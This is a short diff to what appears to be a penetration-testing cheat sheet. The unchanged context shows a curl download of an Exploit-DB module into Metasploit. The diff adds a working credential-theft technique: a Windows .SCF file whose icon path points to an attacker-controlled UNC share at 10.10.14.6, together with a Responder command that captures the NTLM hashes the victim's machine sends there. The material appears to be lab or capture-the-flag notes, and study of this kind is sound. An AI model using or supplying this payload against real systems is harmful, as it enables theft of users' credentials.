@@ -31,7 +31,20 @@ Get path from searchsploit
 curl http://www.exploit-db.com/download/ID  /root/.msf4/modules/exploits/custom/CUSTOMFILENAME
 ```
 
+## .SCF file to gain user hash (WINDOWS)
 
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.6\tools\nc.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+listen to response
+```
+sudo responder -w -I tun0
+```
 
 ## Metadata
 
